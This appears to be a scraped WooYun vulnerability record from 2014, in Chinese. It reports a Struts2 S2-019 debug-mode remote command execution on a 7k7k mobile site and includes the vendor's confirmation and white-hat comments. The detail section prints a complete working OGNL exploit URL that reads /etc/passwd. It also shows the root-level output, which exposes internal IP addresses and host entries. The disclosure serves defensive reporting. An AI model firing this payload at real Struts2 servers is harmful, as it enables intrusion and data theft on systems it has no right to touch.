{"id": 4715, "wybug_id": "wooyun-2014-052891", "wybug_title": "奇客星空development mode配置错误漏洞导致命令执行（root权限）", "wybug_corp": "奇客星空", "wybug_author": "U神", "wybug_date": "2014-03-05 21:13", "wybug_open_date": "2014-04-19 21:14", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-19：\t细节向公众公开  简要描述：  详细说明：  #1.看到奇客星空的确认漏洞如此活跃速度，于是乎就想给它挖几个漏洞，看了下奇客星空的漏洞史，偶然间看到： WooYun: 奇客星空代码执行导致分站沦陷  这个漏洞，漏洞中提到的是Struts2框架的漏洞，和我现在提交的完全不一样，并且厂商在回复中答道：已修复。为了证明厂商已经修复struts2的漏洞，特上此图：URL:http://m.7k7k.com/about.html 这是手机版的奇客星空吧 (⊙_⊙)?\n\n#2.然后想到看看有没有开debug模式试试最新的St2-019的漏洞【Apache Struts 2.3.15.2之前版本的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。】，于是测试一下悲剧了→_→EXP:http://m.7k7k.com/about.html?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest%28%29,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29,%23a=%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b=%23a.getInputStream%28%29,%23c=new%20java.io.InputStreamReader%28%23b%29,%23d=new%20java.io.BufferedReader%28%23c%29,%23e=new%20char[1000],%23d.read%28%23e%29,%23resp.println%28%23e%29,%23resp.close%28%29\n\n还是root权限 =_=|\n\n   漏洞证明：  \n#3.cat /etc/passwd/root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsaslauth:x:499:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/uname -aLinux Ct-gc-bj136 2.6.32-279.el6.x86_64 #1 SMP Fri Jun 22 12:19:21 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux nullifconfig -aeth0      Link encap:Ethernet  HWaddr 00:16:3E:13:E2:A4            inet addr:115.182.59.136  Bcast:115.182.59.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:19472163956 errors:0 dropped:0 overruns:0 frame:0          TX packets:182413747 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:1324808432359 (1.2 TiB)  TX bytes:80369708814 (74.8 GiB)eth1      Link encap:Ethernet  HWaddr 00:16:3E:34:0A:4D            inet addr:192.168.11.136  Bcast:192.168.255.255  Mask:255.255.0.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:1446599118 errors:0 dropped:0 overruns:0 frame:0          TX packets:1016118809 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:490211357961 (456.5 GiB)  TX bytes:473975578474 (441.4 GiB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6115.182.59.176\tso.7k7k.com192.168.11.108  Ct-bj108192.168.11.31\tCt-bj31192.168.11.136 Ct-gc-bj136127.0.0.1 top.7k7k.com192.168.11.149 api.cms.7k7k.com115.182.59.250  s.7k7k.com115.182.59.251  s.7k7k.com115.182.59.252  s.7k7k.com\n   修复方案：  PS:漏洞详情请参考：http://struts.apache.org/release/2.3.x/docs/s2-019.html,有了命令执行还怕没Webshell吗,证明一下漏洞的严重性就好，希望厂商给一个高分rank，求礼物哇=_=，第一次合作，后期再去给你找几个漏洞。   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-03-07 23:50 厂商回复： 感谢白帽作者反馈，确实有此漏洞，已修复，之后联系作者发送小礼物,希望和白帽人员进行合作 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-05 21:14 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  ……    \n     2014-03-05 21:40 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  ……    \n     2014-03-06 09:02 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  又有京东礼品卡拿了    \n     2014-03-06 09:09 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @Coody 要是有礼品卡，正好咱俩一人一张，太多了你肯定花不完，我又不忍心看着礼品卡过期，所以，在这种危急时刻，我毅然挺身而出，站出来为你分担烦恼，这才是兄弟！！你说对不！！！（为了一张礼品卡，我都这么不要脸了，你好意思不给我啊）    \n     2014-03-07 10:47 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @鬼魅羊羔 留点节操........    \n     2014-03-07 12:18 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @奇客星空 修复了？这么快的速度！修复了就确认下吧~    \n     2014-03-07 18:50 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @U神 我诅咒“无影响厂商忽略”    \n     2014-03-07 19:05 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @鬼魅羊羔 @奇客星空 不会吧！我看奇客星空已经修复了，估计是看到了漏洞，我没那么倒霉吧，之前我给某些厂商提交漏洞，一到我这洞就忽略，这回不要这么坑我好吗？还是好好确认下吧~另外赠送@奇客星空 你一个数据库连接信息泄漏    \n     2014-03-07 19:06 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @U神 开玩笑的啦，奇客不会忽略的，放心吧。。这厂商挺靠谱的~~    \n     2014-03-07 19:08 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @鬼魅羊羔 嗯，正是因为某些厂商不会忽略漏洞从而使我们更有了动力给它们挖漏洞~    \n     2014-03-08 00:15 |    \t\t奇客星空(乌云厂商)\t\t \n  @U神 已经确认啦，描述漏洞发现过程很清晰，感谢反馈！    \n     2014-04-20 09:59 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  能把getshell的工具共享给偶一份吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}